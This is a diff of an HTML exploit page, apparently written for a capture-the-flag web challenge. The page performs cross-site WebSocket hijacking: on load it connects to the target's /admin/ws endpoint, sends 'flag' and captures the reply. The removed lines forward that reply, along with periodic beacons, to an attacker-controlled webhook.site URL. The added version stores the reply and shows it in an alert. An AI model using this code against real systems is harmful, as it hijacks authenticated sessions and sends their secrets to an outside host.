@@ -3,97 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket and POST Request</title>
+    <title>WebSocket Flag Request</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const wsUrl = 'ws://ce441-web.spchallenge.ir:8080/admin/ws';
-            const firstWebhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/';
-            const secondWebhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/store_flag';
+            // WebSocket URL
+            const wsUrl = 'ws://hw2-3-web:8080/admin/ws';
 
-            // Function to handle POST request
-            const sendPostRequest = (url, data) => {
-                return fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data),
-                });
+            // Open the WebSocket connection
+            const ws = new WebSocket(wsUrl);
+
+            // When the WebSocket connection opens, send the flag request
+            ws.onopen = () => {
+                console.log('WebSocket connection opened');
+                ws.send('flag'); // Send the 'flag' message to the WebSocket server
             };
 
-            // Step 1: Send initial POST request
-            console.log('Sending initial POST request...');
-            sendPostRequest(firstWebhookUrl, { message: 'Initial POST request sent' })
-                .then(response => {
-                    if (response.ok) {
-                        console.log('Initial POST request sent successfully');
-                        openWebSocket();
-                    } else {
-                        console.error('Failed to send initial POST request. Response status:', response.status);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error sending initial POST request:', error);
-                });
+            // When a message is received from the WebSocket, save and log it
+            ws.onmessage = (event) => {
+                const flag = event.data; // The data received from the WebSocket
+                console.log('Received flag:', flag);
 
-            // Step 2: Open WebSocket connection
-            const openWebSocket = () => {
-                console.log('Opening WebSocket connection...');
-                const ws = new WebSocket(wsUrl);
-                let intervalId; // To store the interval ID
+                // Save the flag (in this case, just storing it in localStorage for simplicity)
+                localStorage.setItem('flag', flag); // Save to localStorage
+                alert('Flag received and saved: ' + flag); // Alert the user with the flag
+            };
 
-                ws.onopen = () => {
-                    console.log('WebSocket connection opened');
-                    ws.send('flag'); // Request the flag
+            // Handle WebSocket errors
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+            };
 
-                    // Start sending POST requests every 5 seconds
-                    intervalId = setInterval(() => {
-                        console.log('Sending status check...');
-                        sendPostRequest(firstWebhookUrl, { message: 'Status check: still waiting for the flag' })
-                            .then(response => {
-                                if (!response.ok) {
-                                    console.error('Failed to send status check. Response status:', response.status);
-                                }
-                            })
-                            .catch(error => {
-                                console.error('Error sending status check:', error);
-                            });
-                    }, 5000); // 5000 ms = 5 seconds
-                };
-
-                ws.onmessage = (event) => {
-                    console.log('Received WebSocket message:', event.data);
-                    sendPostRequest(secondWebhookUrl, { message: event.data })
-                        .then(response => {
-                            if (response.ok) {
-                                console.log('Message sent successfully to the second webhook');
-                            } else {
-                                console.error('Failed to send message to the second webhook. Response status:', response.status);
-                            }
-                        })
-                        .catch(error => {
-                            console.error('Error sending message to the second webhook:', error);
-                        });
-
-                    // Flag received, stop the status check interval and close the WebSocket
-                    clearInterval(intervalId);
-                    ws.close();
-                };
-
-                ws.onerror = (error) => {
-                    console.error('WebSocket error:', error);
-                };
-
-                ws.onclose = () => {
-                    console.log('WebSocket connection closed');
-                    clearInterval(intervalId); // Clear the interval if WebSocket is closed
-                };
+            // When the WebSocket connection closes
+            ws.onclose = () => {
+                console.log('WebSocket connection closed');
             };
         });
     </script>
 </head>
 <body>
-    <h1>WebSocket and POST Request</h1>
-    <p>The flag will be retrieved and sent automatically after the first POST request is completed.</p>
+    <h1>WebSocket Flag Request</h1>
+    <p>The page will open a WebSocket connection to the server, send the message "flag", and save the response.</p>
 </body>
 </html>
